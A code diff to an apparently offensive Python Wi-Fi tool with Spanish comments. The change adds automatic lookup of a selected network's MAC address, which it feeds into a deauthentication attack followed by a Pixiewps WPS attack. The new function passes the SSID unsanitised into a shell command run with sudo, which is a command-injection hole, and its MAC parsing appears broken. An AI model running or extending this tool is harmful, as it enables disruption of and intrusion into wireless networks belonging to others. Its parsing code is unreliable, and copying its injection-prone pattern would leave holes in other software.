@@ -36,6 +36,19 @@ def scan_wifi():
     
     return networks
 
+def get_mac_address(ssid):
+    """Obtener la dirección MAC de una red Wi-Fi a partir de su SSID"""
+    print(f"Obteniendo MAC para la red: {ssid}\n")
+    result = run_command(f"iw dev wlan0 scan | grep '{ssid}' -A 5 | grep 'SSID' -A 10", use_sudo=True)
+    
+    mac = None
+    for line in result.splitlines():
+        if 'address' in line.lower():
+            mac = line.split(":")[1].strip()
+            break
+    
+    return mac
+
 def select_network(networks):
     """Permitir al usuario seleccionar una red"""
     if not networks:
@@ -80,9 +93,15 @@ def main():
     if target_network:
         print(f"\nHas seleccionado la red: {target_network}")
     
-        # Esperar y hacer el ataque de desautenticación (Ejemplo con MAC)
-        target_mac = input("Introduce la MAC del objetivo para desautenticación (de la red seleccionada): ")
-        deauth_attack(target_mac)
+        # Obtener la dirección MAC de la red seleccionada
+        target_mac = get_mac_address(target_network)
+        
+        if target_mac:
+            print(f"Dirección MAC obtenida: {target_mac}")
+            # Realizar ataque de desautenticación
+            deauth_attack(target_mac)
+        else:
+            print("No se pudo obtener la dirección MAC de la red seleccionada.")
         
         # Realizar ataque Pixiewps
         target_pcap = input("Introduce el archivo pcap para Pixiewps: ")
@@ -90,3 +109,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
